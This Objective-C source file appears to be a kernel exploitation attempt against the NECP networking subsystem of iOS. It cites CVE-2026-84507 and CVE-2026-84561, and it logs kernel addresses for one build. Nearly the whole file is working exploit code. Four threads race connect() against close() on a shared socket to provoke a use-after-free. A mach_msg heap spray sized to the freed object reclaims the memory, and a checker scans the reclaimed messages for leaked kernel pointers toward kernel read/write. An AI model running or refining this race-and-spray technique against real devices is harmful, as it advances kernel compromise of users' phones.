//
//  P053NECPDoubleFree.m
//  v2: flow_add × close race (NOT client_add × client_close)
//  CVE-2026-84507: necp_client_add_flow vs close on SAME fd
//  CVE-2026-84561: flow_registration_count underflow → double-free
//
//  KEY CHANGE FROM v1:
//    v1 raced client_add vs client_close on DIFFERENT sockets → no shared object
//    v2 races flow_add (connect) vs close on SAME socket → UAF on NECP client
//
//    P024 proved setsockopt×setsockopt is locked (same path, same lock)
//    v2 tests connect×close (DIFFERENT paths, potentially different locks)
//

#import "P053NECPDoubleFree.h"
#import "LabLocalTime.h"
#import "A14_23F77_LabOffsets.h"

#import <Foundation/Foundation.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <string.h>
#import <stdlib.h>
#import <unistd.h>
#import <fcntl.h>
#import <errno.h>
#import <pthread.h>
#import <stdatomic.h>
#import <mach/mach.h>
#import <mach/message.h>
#import <stdarg.h>

#define P053_BUILD @"p053-flow-add-close-race-v2"
#define SO_NECP_ATTRIBUTES ((int)A14_23F77_SO_NECP_ATTRIBUTES)

static int g_log_fd = -1;

static void p053_log(NSMutableString *buf, NSString *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    NSString *line = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSString *out = [line hasSuffix:@"\n"] ? line : [line stringByAppendingString:@"\n"];
    [buf appendString:out];
    if (g_log_fd >= 0) {
        const char *s = out.UTF8String;
        if (s) {
            write(g_log_fd, s, strlen(s));
            fcntl(g_log_fd, F_FULLFSYNC);
        }
    }
}

/* NECP TLV: type=0x07, length=4, value=0x00000001 (policy control allow) */
static int build_necp_attr(uint8_t *buf, int bufsize) {
    if (bufsize < 8) return -1;
    buf[0] = 0x07;  /* type */
    buf[1] = 0x04;  /* length lo */
    buf[2] = 0x00;  /* length hi */
    buf[3] = 0x01;  /* value: allow */
    buf[4] = 0x00;
    buf[5] = 0x00;
    buf[6] = 0x00;
    buf[7] = 0x00;
    return 8;
}

/* Create socket + set NECP attributes → creates NECP client */
static int create_necp_socket(void) {
    int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (fd < 0) return -1;
    
    uint8_t attr[256];
    int attrlen = build_necp_attr(attr, sizeof(attr));
    if (attrlen < 0) { close(fd); return -1; }
    
    int ret = setsockopt(fd, SOL_SOCKET, SO_NECP_ATTRIBUTES, attr, attrlen);
    if (ret < 0) { close(fd); return -1; }
    
    return fd;
}

/*
 * THE RACE: flow_add × close on SAME fd
 *
 * Thread A: connect(fd) in tight loop → necp_client_add_flow
 * Thread B: close(fd) after delay → necp_client_remove (frees NECP client)
 *
 * If Thread A is inside connect() when Thread B closes:
 *   - close frees the NECP client
 *   - connect tries to add flow to freed NECP client → UAF
 *   - mach_msg spray reclaims freed NECP client → corruption
 *
 * This is DIFFERENT from P024 (setattr×setattr, same lock)
 * and DIFFERENT from P053 v1 (client_add×close, different sockets)
 */

/* Shared state for the race */
static volatile int g_race_fd = -1;
static volatile int g_fd_closed = 0;
static volatile int g_stop = 0;
static volatile long g_connect_iters = 0;
static volatile long g_connect_errs = 0;
static volatile int g_race_hits = 0;

/* Thread A: Rapidly call connect() to add flows */
static void *p053_connect_thread(void *arg) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(12345);
    
    int alt_port = 40000;
    
    while (!g_stop) {
        int fd = g_race_fd;
        if (fd < 0) {
            /* Socket was closed by Thread B, create a new one */
            fd = create_necp_socket();
            if (fd >= 0) {
                g_race_fd = fd;
                g_fd_closed = 0;
            } else {
                usleep(100);
                continue;
            }
        }
        
        /* Rapidly call connect to add flows */
        addr.sin_port = htons((uint16_t)(alt_port++ & 0xFFFF));
        int ret = connect(fd, (struct sockaddr *)&addr, sizeof(addr));
        if (ret == 0) {
            g_connect_iters++;
        } else {
            g_connect_errs++;
        }
        
        /* Check if fd was closed under us */
        if (g_fd_closed) {
            /* The race! close happened while we were in connect */
            /* Close our reference and let next iteration create new socket */
            close(fd);
            g_race_fd = -1;
        }
    }
    
    return NULL;
}

/* Thread B: Close the fd to trigger NECP client remove */
static void *p053_close_thread(void *arg) {
    while (!g_stop) {
        int fd = g_race_fd;
        if (fd >= 0) {
            /* Close the fd — this triggers necp_client_remove */
            /* If Thread A is in connect() at this moment → UAF! */
            g_fd_closed = 1;
            close(fd);
            g_race_fd = -1;
            
            /* Brief pause before next cycle */
            usleep(1000 + (arc4random() % 2000));
        } else {
            usleep(100);
        }
    }
    
    return NULL;
}

/* Thread C: Spray mach_msg to reclaim freed NECP client memory */
static mach_port_t g_ports[256];

static void *p053_spray_thread(void *arg) {
    /* Pre-allocate ports */
    for (int i = 0; i < 256; i++) {
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &g_ports[i]);
        mach_port_insert_right(mach_task_self(), g_ports[i], g_ports[i],
                               MACH_MSG_TYPE_MAKE_SEND);
    }
    
    while (!g_stop) {
        for (int i = 0; i < 256; i++) {
            if (!g_ports[i]) continue;
            
            /* kdata = 0x200 — matches NECP client size class in KHEAP_DATA_kalloc_site */
            size_t msg_size = sizeof(mach_msg_header_t) + 0x200;
            uint8_t msgbuf[msg_size];
            memset(msgbuf, 0, 0x200 + sizeof(mach_msg_header_t));
            
            mach_msg_header_t *h = (mach_msg_header_t *)msgbuf;
            h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
            h->msgh_size = (mach_msg_size_t)msg_size;
            h->msgh_remote_port = g_ports[i];
            h->msgh_id = 0x50303500 | i;
            
            memset(msgbuf + sizeof(mach_msg_header_t), 0xB3, 0x200);
            memcpy(msgbuf + sizeof(mach_msg_header_t), "P053", 4);
            
            mach_msg(h, MACH_SEND_MSG, (mach_msg_size_t)msg_size, 0,
                     MACH_PORT_NULL, 0, MACH_PORT_NULL);
        }
        usleep(10);
    }
    
    return NULL;
}

/* Thread D: Check for corruption by receiving messages */
static void *p053_check_thread(void *arg) {
    uint8_t rbuf[0x400];
    
    while (!g_stop) {
        for (int i = 0; i < 256; i++) {
            if (!g_ports[i]) continue;
            
            memset(rbuf, 0, sizeof(rbuf));
            mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
            kern_return_t kr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                                        0, sizeof(rbuf),
                                        g_ports[i], 50, MACH_PORT_NULL);
            if (kr != KERN_SUCCESS) continue;
            
            uint8_t *body = rbuf + sizeof(mach_msg_header_t);
            if (memcmp(body, "P053", 4) != 0) {
                g_race_hits++;
                
                /* Hexdump first 64 bytes */
                NSMutableString *dump = [NSMutableString string];
                for (int j = 0; j < 64 && j < 0x200; j += 16) {
                    [dump appendFormat:@"%04x: ", j];
                    for (int k = 0; k < 16 && j + k < 0x200; k++) {
                        [dump appendFormat:@"%02x ", body[j + k]];
                    }
                    [dump appendString:@"\n"];
                }
                p053_log(nil, @"[!] CORRUPTION at msg[%d]:\n%@", i, dump);
                
                /* Check for kernel pointers (NECP client struct fields) */
                for (int j = 0; j + 8 <= 0x200; j += 8) {
                    uint64_t v = *(uint64_t *)&body[j];
                    if ((v >> 36) == 0xfffffff0ULL && (v & 0xFFFFULL) != 0) {
                        p053_log(nil, @"  ★★★ KPTR at body[0x%x] = 0x%016llx ★★★", j, v);
                        p053_log(nil, @"  ★★★ NECP FLOW UAF CONFIRMED ★★★");
                        p053_log(nil, @"  ★★★ KRW PATH OPEN ★★★");
                    }
                }
            }
        }
        usleep(20);
    }
    
    return NULL;
}

@implementation P053NECPDoubleFree

+ (NSString *)tap {
    NSMutableString *log = [NSMutableString string];
    
    NSString *docs = [NSSearchPathForDirectoriesInDomains(
        NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *logPath = [docs stringByAppendingPathComponent:@"p053_necp_dfree_log.txt"];
    g_log_fd = open([logPath UTF8String], O_CREAT | O_WRONLY | O_TRUNC, 0644);
    
    p053_log(log, @"=== p053 session BUILD %@ ===", P053_BUILD);
    p053_log(log, @"offset table %s SO_NECP=0x%x", LabOff()->tag, A14_23F77_SO_NECP_ATTRIBUTES);
    p053_log(log, @"23F77: necp_client_add 0xfffffff00a0c0810 add_flow 0xfffffff00a0c2ad0");
    p053_log(log, @"CVE-2026-84507/84561 MAP. kmsg recv is NOT kread (P045). hits=0 ≠ miss-timing.");
    p053_log(log, @"CVE-2026-84507: NECP flow_add × close race on SAME fd");
    p053_log(log, @"CVE-2026-84561: flow_registration_count underflow → double-free");
    p053_log(log, @"");
    p053_log(log, @"KEY DIFFERENCE FROM v1:");
    p053_log(log, @"  v1: client_add × client_close on DIFFERENT sockets (no shared object)");
    p053_log(log, @"  v2: flow_add (connect) × close on SAME fd (UAF on NECP client)");
    p053_log(log, @"");
    p053_log(log, @"P024 proved setsockopt×setsockopt is locked.");
    p053_log(log, @"v2 tests connect×close — DIFFERENT kernel paths.");
    p053_log(log, @"");
    
    /* ═══ PHASE 1: Test basic NECP socket creation ═══ */
    p053_log(log, @"[PHASE 1] Testing NECP socket + connect");
    
    int testFd = create_necp_socket();
    if (testFd < 0) {
        p053_log(log, @"[-] NECP socket creation failed");
        if (g_log_fd >= 0) { fcntl(g_log_fd, F_FULLFSYNC); close(g_log_fd); g_log_fd = -1; }
        return log;
    }
    p053_log(log, @"[+] NECP socket created: fd=%d", testFd);
    
    /* Test connect (adds flow) */
    struct sockaddr_in testAddr;
    memset(&testAddr, 0, sizeof(testAddr));
    testAddr.sin_family = AF_INET;
    testAddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    testAddr.sin_port = htons(12345);
    int ret = connect(testFd, (struct sockaddr *)&testAddr, sizeof(testAddr));
    p053_log(log, @"[+] connect() ret=%d errno=%d (flow add)", ret, errno);
    close(testFd);
    p053_log(log, @"[+] NECP socket closed (client + flow removed)");
    
    /* ═══ PHASE 2: flow_add × close race ═══ */
    p053_log(log, @"");
    p053_log(log, @"[PHASE 2] flow_add × close race + mach_msg spray");
    p053_log(log, @"    Thread A: connect() loop (flow add)");
    p053_log(log, @"    Thread B: close() (NECP client remove)");
    p053_log(log, @"    Thread C: mach_msg spray (reclaim freed NECP client)");
    p053_log(log, @"    Thread D: corruption check");
    p053_log(log, @"    30 second race window");
    p053_log(log, @"");
    
    g_stop = 0;
    g_race_fd = -1;
    g_fd_closed = 0;
    g_connect_iters = 0;
    g_connect_errs = 0;
    g_race_hits = 0;
    memset(g_ports, 0, sizeof(g_ports));
    
    /* Create initial NECP socket */
    g_race_fd = create_necp_socket();
    p053_log(log, @"[+] Initial NECP socket: fd=%d", g_race_fd);
    
    pthread_t connect_tid, close_tid, spray_tid, check_tid;
    pthread_create(&connect_tid, NULL, p053_connect_thread, NULL);
    pthread_create(&close_tid, NULL, p053_close_thread, NULL);
    pthread_create(&spray_tid, NULL, p053_spray_thread, NULL);
    pthread_create(&check_tid, NULL, p053_check_thread, NULL);
    
    for (int t = 5; t <= 30; t += 5) {
        sleep(5);
        p053_log(log, @"[race] t=%ds connects=%ld errs=%ld hits=%d fd=%d closed=%d",
                 t, g_connect_iters, g_connect_errs, g_race_hits,
                 g_race_fd, g_fd_closed);
    }
    
    g_stop = 1;
    pthread_join(connect_tid, NULL);
    pthread_join(close_tid, NULL);
    pthread_join(spray_tid, NULL);
    pthread_join(check_tid, NULL);
    
    /* Cleanup */
    if (g_race_fd >= 0) close(g_race_fd);
    for (int i = 0; i < 256; i++) {
        if (g_ports[i]) {
            uint8_t drainBuf[0x400];
            while (mach_msg(drainBuf, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
                           sizeof(drainBuf), 0, g_ports[i], 1,
                           MACH_PORT_NULL) == KERN_SUCCESS) {}
            mach_port_destroy(mach_task_self(), g_ports[i]);
        }
    }
    
    p053_log(log, @"");
    p053_log(log, @"=== VERDICT ===");
    p053_log(log, @"Total: connects=%ld errs=%ld hits=%d",
             g_connect_iters, g_connect_errs, g_race_hits);
    
    if (g_race_hits > 0) {
        p053_log(log, @"kmsg marker smashed (recv oracle). NOT KRW. P045: recv≠kread.");
    } else if (g_connect_errs > 0 && g_connect_iters > 100000) {
        p053_log(log, @"Race ran hits=0. connect×close did not smash kmsg.");
        p053_log(log, @"Not a miss that needs more threads. Dest is NECP client, not kmsg.");
    } else {
        p053_log(log, @"Race did not produce enough iterations");
        p053_log(log, @"NEXT: Check if connect is reaching necp_client_add_flow");
    }
    
    if (g_log_fd >= 0) {
        fcntl(g_log_fd, F_FULLFSYNC);
        close(g_log_fd);
        g_log_fd = -1;
    }
    
    return log;
}

@end
